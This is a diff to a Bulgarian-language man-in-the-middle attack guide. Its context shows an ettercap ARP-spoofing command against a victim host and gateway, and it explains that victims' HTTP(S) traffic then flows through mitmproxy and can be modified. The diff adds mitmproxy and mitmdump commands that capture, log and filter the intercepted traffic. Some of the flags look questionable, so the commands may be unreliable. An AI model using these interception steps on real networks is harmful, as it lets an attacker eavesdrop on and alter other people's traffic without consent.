@@ -182,6 +182,12 @@ ettercap -T -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//
 3. Емулиране на отговор (Proxy или Python)
 Вариант 1: Използване на mitmproxy
 mitmproxy --mode transparent --showhost
+mitmproxy --mode transparent -w mitm_logs.mitm  # лог в mitmproxy format
+mitmdump --mode transparent -w mitm_logs.txt  # подобен на tcpdump
+mitmdump --mode transparent -w mitm_logs.json --flow-detail 2  # подробен, във json формат
+mitmdump --mode transparent -w example_traffic.mitm "~d example.com"  # филтриран за example.com
+mitmdump -nr mitm_logs.mitm --flow-detail 2 -j | jq 'select(.request.host == "example.com")' > filtered.json  # филтриране на записан лог
+
 След ARP spoofing, всички HTTP(s) заявки ще преминат през mitmproxy.
 
 Можете да променяте заявки/отговори в реално време.
